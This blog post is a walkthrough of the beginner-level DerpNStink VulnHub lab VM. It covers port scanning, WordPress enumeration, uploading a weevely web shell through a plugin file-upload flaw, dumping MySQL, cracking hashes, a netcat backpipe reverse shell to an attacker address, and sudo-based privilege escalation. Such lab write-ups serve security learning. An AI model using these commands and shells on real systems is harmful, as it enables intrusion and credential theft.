---
layout: post
title:  "DerpNStink won't stink anymore"
subtitle: "Resolving boot2root DerpNStink VM"
categories: [itsec,English]
typora-copy-images-to: ipic
---

Another day another boot2root VM. This time [DerpNStink](https://www.vulnhub.com/entry/derpnstink-1,221/), it's level is "beginner". To make things short, let's dive in.

* Will be replaced with the ToC, excluding the "Contents" header
{:toc}

## Information

The VM includes 4 flags to find, flags are having format `flag[int])([random string])`. Goal is to get root access to the machine. There are no hints given.

## Flag 1

Obtaining flag 1 is pretty easy. First we do a port scan on the VM:

```
root@kali:~/pentesting/vulnhub/derpnstink# nmap -A -O -n -p- 192.168.159.132
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-05 14:57 CEST
Nmap scan report for 192.168.159.132
Host is up (0.0010s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 2 disallowed entries
|_/php/ /temporary/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: DeRPnStiNK
MAC Address: 00:0C:29:30:50:3E (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.04 ms 192.168.159.132

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.90 seconds
```

We see that ports `21,22,80` are open. Testing **FTP** port:
```
root@kali:~/pentesting/vulnhub/derpnstink# ftp 192.168.159.132
Connected to 192.168.159.132.
220 (vsFTPd 3.0.2)
Name (192.168.159.132:root): anonymous
530 Permission denied.
Login failed.
ftp>
```
Okay, so no access. Let's focus on `:80` then and open it with Firefox.

![](https://i.imgur.com/p84g5Gd.jpg)

And `curl` it:

```
root@kali:~/pentesting/vulnhub/derpnstink# curl 192.168.159.132
<html >

<head>

    <meta charset="UTF-8">

    <title>DeRPnStiNK</title>

    <link rel="stylesheet" href="css/style.css">
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
<script type="text/javascript" src="/is/js/release/kveik.1.4.24.js?1"></script>
<script type="text/info" src="/webnotes/info.txt"></script>
</head>

<body>
  <!-- particles.js container -->
<div id="particles-js"></div>

<!-- stats - count particles -->
<div class="count-particles">

</div>
<div class="divhead"
<h1 style="color:Purple; font-size:250%;">DeRPnStiNK</h1>
</div>
<div class="divpic">
<table>
	    <tr>
    	    <td style="padding:5px">
        	    <img src="derp.png">
      	    </td>
            <td style="padding:5px">
            	<img src="stinky.png">
             </td>
        </tr>
    </table>

</div>

<script src='js/particles.min.js'></script>
<script src="js/index.js"></script>

</body>






















































<div>
<div>
<div>
<div>
<div>
<div>
<div>
<div class=tryharder>
<div>
<div>
<div>
<div>
<div>
<div>
<--flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) -->
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>




</html>
```

Oh, we have our 1st flag here: `flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166)`

## Flag 2

Processing further we noticed that a `robots.txt` file was mentioned by the port scan. The content is as below:

```
User-agent: *
Disallow: /php/
Disallow: /temporary/
```

Folder `/php/` gives `403 Forbidden` and `temporary` a `200 OK` with this content:

> try harder!

So, let's search for known directories with `gobuster`:
```
root@kali:~# gobuster -e -t 120 -u http://192.168.159.132/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.159.132/
[+] Threads      : 120
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 307,200,204,301,302
[+] Expanded     : true
=====================================================
http://192.168.159.132/weblog (Status: 301)
http://192.168.159.132/php (Status: 301)
http://192.168.159.132/css (Status: 301)
http://192.168.159.132/js (Status: 301)
http://192.168.159.132/javascript (Status: 301)
http://192.168.159.132/temporary (Status: 301)
=====================================================
```

And for `/php/` we found:
```
http://192.168.159.132/php/info.php (Status: 200)
http://192.168.159.132/php/phpmyadmin (Status: 301)
```
`info.php` is just empty and `phpmyadmin/` is what it says. In `/temporary/` I cannot find anything of interest.
Interesting is the folder `/weblog`, when I open it this is shown:

![](https://i.imgur.com/LbmUyqW.png)

That means we are being redirect to `derpnstink.local`, so let's change our `hosts` file: `echo -e "192.168.159.132 derpnstink.local" | tee -a /etc/hosts`

![](https://i.imgur.com/2wUHru8.png)

Hello website! And it's

> Proudly powered by WordPress

Let's crawl deeper inside the rabbit hole. `wpscan` is a nice tool to get some information about *Wordpress* installs. It gathers information about the installed version, users and extensions like themes and plugins. Also it checks if there are known vulnerabilities for these.

```
root@kali:~# wpscan --url http://derpnstink.local/weblog/ -e u,vp,vt
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://derpnstink.local/weblog/
[+] Started: Tue Jun  5 20:17:14 2018

[!] The WordPress 'http://derpnstink.local/weblog/readme.html' file exists exposing a version number
[+] Interesting header: LINK: <http://derpnstink.local/weblog/wp-json/>; rel="https://api.w.org/"
[+] Interesting header: LINK: <http://derpnstink.local/weblog/>; rel=shortlink
[+] Interesting header: SERVER: Apache/2.4.7 (Ubuntu)
[+] Interesting header: X-POWERED-BY: PHP/5.5.9-1ubuntu4.22
[+] XML-RPC Interface available under: http://derpnstink.local/weblog/xmlrpc.php

[+] WordPress version 4.6.9 (Released on 2017-11-29) identified from meta generator, links opml
[!] 5 vulnerabilities identified from the version number

[!] Title: WordPress 3.7-4.9.1 - MediaElement Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/9006
    Reference: https://github.com/WordPress/WordPress/commit/3fe9cb61ee71fcfadb5e002399296fcc1198d850
    Reference: https://wordpress.org/news/2018/01/wordpress-4-9-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/ticket/42720
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5776
[i] Fixed in: 4.6.10

[!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
    Reference: https://wpvulndb.com/vulnerabilities/9021
    Reference: https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
    Reference: https://github.com/quitten/doser.py
    Reference: https://thehackernews.com/2018/02/wordpress-dos-exploit.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389

[!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
    Reference: https://wpvulndb.com/vulnerabilities/9053
    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
[i] Fixed in: 4.6.11

[!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
    Reference: https://wpvulndb.com/vulnerabilities/9054
    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
[i] Fixed in: 4.6.11

[!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
    Reference: https://wpvulndb.com/vulnerabilities/9055
    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
[i] Fixed in: 4.6.11

[+] WordPress theme in use: twentysixteen - v1.3

[+] Name: twentysixteen - v1.3
 |  Last updated: 2018-05-17T00:00:00.000Z
 |  Location: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/
 |  Readme: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/readme.txt
[!] The version is out of date, the latest version is 1.5
 |  Style URL: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css
 |  Theme Name: Twenty Sixteen
 |  Theme URI: https://wordpress.org/themes/twentysixteen/
 |  Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthe...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating installed plugins (only ones with known vulnerabilities) ...

   Time: 00:00:01 <=================================================================> (1644 / 1644) 100.00% Time: 00:00:01

[+] We found 1 plugins:

[+] Name: slideshow-gallery - v1.4.6
 |  Last updated: 2017-07-17T09:36:00.000Z
 |  Location: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/
 |  Readme: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt
[!] The version is out of date, the latest version is 1.6.7.1

[!] Title: Slideshow Gallery < 1.4.7 Arbitrary File Upload
    Reference: https://wpvulndb.com/vulnerabilities/7532
    Reference: http://seclists.org/bugtraq/2014/Sep/1
    Reference: http://packetstormsecurity.com/files/131526/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460
    Reference: https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload
    Reference: https://www.exploit-db.com/exploits/34681/
    Reference: https://www.exploit-db.com/exploits/34514/
[i] Fixed in: 1.4.7

[!] Title: Tribulant Slideshow Gallery <= 1.5.3 - Arbitrary file upload & Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8263
    Reference: http://cinu.pl/research/wp-plugins/mail_5954cbf04cd033877e5415a0c6fba532.html
    Reference: http://blog.cinu.pl/2015/11/php-static-code-analysis-vs-top-1000-wordpress-plugins.html
[i] Fixed in: 1.5.3.4

[!] Title: Tribulant Slideshow Gallery <= 1.6.4 - Authenticated Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8786
    Reference: https://sumofpwn.nl/advisory/2016/cross_site_scripting_vulnerability_in_tribulant_slideshow_galleries_wordpress_plugin.html
    Reference: https://plugins.trac.wordpress.org/changeset/1609730/slideshow-gallery
[i] Fixed in: 1.6.5

[!] Title: Slideshow Gallery <= 1.6.5 - Multiple Authenticated Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8795
    Reference: http://www.defensecode.com/advisories/DC-2017-01-014_WordPress_Tribulant_Slideshow_Gallery_Plugin_Advisory.pdf
    Reference: https://packetstormsecurity.com/files/142079/DC-2017-01-014.pdf
[i] Fixed in: 1.6.6

[+] Enumerating installed themes (only ones with known vulnerabilities) ...

   Time: 00:00:00 <===================================================================> (286 / 286) 100.00% Time: 00:00:00

[+] No themes found

[+] Enumerating usernames ...
[+] Identified the following 2 user/s:
    +----+-------------+---------------------------------+
    | Id | Login       | Name                            |
    +----+-------------+---------------------------------+
    | 1  | unclestinky | 404 Not                         |
    | 2  | admin       | admin – DeRPnStiNK Professional |
    +----+-------------+---------------------------------+

[+] Finished: Tue Jun  5 20:17:22 2018
[+] Requests Done: 2334
[+] Memory used: 119.941 MB
[+] Elapsed time: 00:00:08
```
Let's focus on the vulns which are interesting for us. *file upload* is one of the buzzwords for us, we are seeing that the plugin `Slideshow Gallery` is outdated and working exploits are existing. With that version the uploaded file type won't be checked. There is a nice rule if you code:

> never trust the user

This means you have to check all inputs you get from a user. Really, do it!  
[Here](https://www.exploit-db.com/exploits/34681/) is a Python script to upload a file via a vulnerability. Hooray!
To gain access to the server's system I'll upload a PHP shell which is able to get a working shell on the system. I use [weevely3](https://github.com/epinna/weevely3) to gain that goal. This a very tiny shell to where I will connect. We use it like that in our scenario:
```
root@kali:~/tools/weevely3# ./weevely.py generate r00t agent.php
Generated 'agent.php' with password 'r00t' of 675 byte size.
```
But wait, we need login credentials to be able to use the exploit. The scan of `wpscan` shows that two users are existing, `admin` and `unclestinky`. With some luck I got `admin:admin`, very secure! Upload the shell:
```
root@kali:~/pentesting/vulnhub/derpnstink# python wp_gallery_slideshow_146_suv.py -u admin -p admin -t http://derpnstink.local/weblog/ -f agent.php
[...]
[+] Username & password ACCEPTED!

[!] Shell Uploaded!
[+] Check url: http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/agent.php (lowercase!!!!)
```
Use it:
```
root@kali:~/tools/weevely3# ./weevely.py http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/agent.php r00t

[+] weevely 3.6

[+] Target:	www-data@DeRPnStiNK:/var/www/html/weblog/wp-content/uploads/slideshow-gallery
[+] Session:	/root/.weevely/sessions/derpnstink.local/agent_0.session
[+] Shell:	System shell

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely>
www-data@DeRPnStiNK:/var/www/html/weblog/wp-content/uploads/slideshow-gallery $ cd ../../
www-data@DeRPnStiNK:/var/www/html/weblog/wp-content $ cd ../
www-data@DeRPnStiNK:/var/www/html/weblog $ ls
index.php
license.txt
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config-sample.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php
www-data@DeRPnStiNK:/var/www/html/weblog $ cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'mysql');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         's%|W}Qf|a;(QY-E]Axb-JX~M5rvs8W~mOv Wj)+(%<!b.5Ed/)f^1|5aBS-s;k>/');
define('SECURE_AUTH_KEY',  '[6yT.2HJ#>um@xg@dDzk)m+>qL|i-rpZ($)x}-%B7<j!&-X2R)b#k|%{n-mA-I&0');
define('LOGGED_IN_KEY',    'yOb;5LX`bCjk*l^|X]%ud7|X,*y4}1MNqr|c}Sxly(mt%S+g#kR@K}~mBrG%D[vG');
define('NONCE_KEY',        ')?88dD5Yu(mKJDq)>E1~2%K Cm^HY&] (S7EtEI,X-?n3T)ui#Tfm[t_bz=I-ZK8');
define('AUTH_SALT',        '7,q<zw7`I!N6K>L=]fY:A.[+W`E^``|I+U|W4C(e_Ph `|KVfd{BbRbO?rFp,AN:');
define('SECURE_AUTH_SALT', '14EV-M=x?/lW3ODB7ro^;}&J4&ggBY#xohsa&7ZX/l[Xp,P;DY;AbPDA4oO#<vKd');
define('LOGGED_IN_SALT',   'X7u~-+BjC%vj!Ht<nzu~qs/m[~)C</G7:s,Q$M`zD>X91xC;btxvAe-^/5.(C(|j');
define('NONCE_SALT',       'wi*WOj8Q*+_Vvk23ImDiNDToe3}P>F!$w@Bkz9+BoA/6%{bldVnPb]+l0/U]|;=c');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
www-data@DeRPnStiNK:/var/www/html/weblog $
```

We have a valid login for *MySQL* here, as `root`. Woot? So we dump all databases on our webshell: `mysqldump --user=root --password=mysql --all-databases > dump.sql` and then download the SQL file. At first I'm searching for a flag (we know the pattern of it):
```
root@kali:~/pentesting/vulnhub/derpnstink# cat dump.sql | grep -o "flag[0-9]([0-9A-Za-z]*)"
flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)
flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)
```

Hooray, we found our 2nd flag!

## Flag 3

It's half time, we found 2 flags out of 4. At first, let's dig deeper inside the SQL dump.
Interesting might be the passwords for the users.
```
INSERT INTO 'wp_users' VALUES
(1,'unclestinky','$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41','unclestinky','unclestinky@DeRPnStiNK.local','','2017-11-12 03:25:32','1510544888:$P$BQbCmzW/ICRqb1hU96nIVUFOlNMKJM1',0,'unclestinky',''),
(2,'admin','$P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/','admin','admin@derpnstink.local','','2017-11-13 04:29:35','',0,'admin','');
```
We know that `admin` has the password `admin`, as of that I focus on the two password strings of `unclestinky`.
When we use hash type 400 in *hashcat* and using `rockyou.txt` as wordlist (Kali Linux has it in `/usr/share/wordlists/` as compressed file) we'll get: `$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41:wedgie57`

Where to use it then? Let's see which users we have in `/etc/passwd`:
```
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
libuuid
syslog
messagebus
usbmux
dnsmasq
avahi-autoipd
kernoops
rtkit
saned
whoopsie
speech-dispatcher
avahi
lightdm
colord
hplip
pulse
mysql
sshd
stinky
ftp
mrderp
```

Hmm, `stinky`, `unclestinky`. I hardly guess that's the same guy. When I try to login via *SSH* with `stinky:wedgie57` I only get 

> stinky@derpnstink.local: Permission denied (publickey).

We don't have one...  
But! There is the command `su`, with that we are able to switch our identity on the system (terminal based access). When we enter that in our *weevely3* shell it results in an error: `su: must be run from a terminal`. So we need a valid `tty` shell. To check if we are on `tty` just simply enter `tty`:
```
www-data@DeRPnStiNK:/var/www/html/weblog/wp-content/uploads/slideshow-gallery $ tty
not a tty
```
I did not manage to get a proper `tty` terminal inside *weevely3*, neither with `python -c 'import pty; pty.spawn("/bin/sh")'` nor with `/bin/sh -i`. If you want a list of some commands to spawn a `tty` shell look [here](https://netsec.ws/?p=337).  
I got some help from [@eiphunt3r](https://twitter.com/eiphunt3r), he mentioned [this article](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) to gain a tty shell with `socat`. Problem: there is no `socat` on the target machine, also the static binary won't work. `nc` is installed to get a reverse shell, but it's the verson without the option `-e`. Bad, bad. Wait, help is on the way! I found [this article](https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/) regarding a workaround for the missing `-e` parameter. Using it:
first spawn up a listener on your machine: `nc -lvp 4444`. Then throw that command to your *weevely3* shell:
`/bin/sh 0</tmp/backpipe | nc 192.168.159.128 4444 1>/tmp/backpipe`. Well,

> not a tty

No problem! Throwing that in:
```
python -c 'import pty; pty.spawn("/bin/sh")'
$ tty
tty
/dev/pts/19
```

Finally! Now, let's `su`:
```
$ su stinky
su stinky
Password: wedgie57

stinky@DeRPnStiNK:/var/www/html/weblog/wp-content/uploads/slideshow-gallery$ id
<html/weblog/wp-content/uploads/slideshow-gallery$ id                        
uid=1001(stinky) gid=1001(stinky) groups=1001(stinky)
```
We are user `stinky` now. Crawling his home folder we got some files:

* `~/Desktop/flag.txt`: our 3rd flag! (`flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)`)
* `~/Documents/derpissues.pcap`: a packet capture file, we will focus on that later
* `ftp/files/network-logs/derpissues.txt`: a chat log
* `~/ftp/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh/key.txt`: a private key, might be for SSH

## Flag 4

Last flag to obtain. Firstly: with the obtained `key.txt` file we are able to login via SSH as stinky, it's really the private key for the account. So we don't need to jump around spawned shells anymore.

Regarding the chat log we see that `mrderp` deleted his account and `stinky` created it again with a new password. `mrderp` captured the network transmission, that's file `derpissues.pcap`.
Let's open it in **Wireshark**.  
We see a normal capture of the whole traffic which happened for the recorded time. What we might want to see is the event when the account for `mrderp` has been created or when he logged in. There we might see the used password. Good that the session was not encrypted with TLS. When a user logs in, Wordpress uses HTTP method POST, so simply filter for POST methods: `http.request.method == POST`. There we see `/weblog/wp-login.php` as target, the file where Wordpress handles the login request.

![](https://i.imgur.com/sOSsQup.png)

Bingo! The used password was `derpderpderpderpderpderpderp`, so why don't try also `su` here?
```
stinky@DeRPnStiNK:~/ftp/files/network-logs$ su mrderp
Password:
mrderp@DeRPnStiNK:/home/stinky/ftp/files/network-logs$ id
uid=1000(mrderp) gid=1000(mrderp) groups=1000(mrderp)
```

Ha! Basic enumeration is looking which `sudo` privileges someone has:
```
mrderp@DeRPnStiNK:/home/stinky/ftp/files/network-logs$ sudo -l
[sudo] password for mrderp:
Matching Defaults entries for mrderp on DeRPnStiNK:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
```
That means that we are able to use all commands as privileged user when we start something in `/home/mrderp/binaries/` which is starting with filename `derpy`.  
I created a simple BASH script for that:
```
#!/bin/bash
/bin/sh -i
```

Running it with `sudo`:
```
mrderp@DeRPnStiNK:~$ sudo /home/mrderp/binaries/derpy_root.sh
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root
Desktop  Documents  Downloads
# ls /root/Desktop
flag.txt
# cat /root/Desktop/flag.txt
flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)

Congrats on rooting my first VulnOS!

Hit me up on twitter and let me know your thoughts!

@securekomodo


#
```

We have our last flag!

## Conclusion

This was a easy boot2root VM, as it says 'beginner' level. We saw that using outdated versions of plugins is a bad thing, just keep them up to date. Also using weak passwords is a bad thing.
And enumeration is the key to success. Overall it was a funny VM which I enjoyed.

![](https://i.imgur.com/FkbH50O.jpg)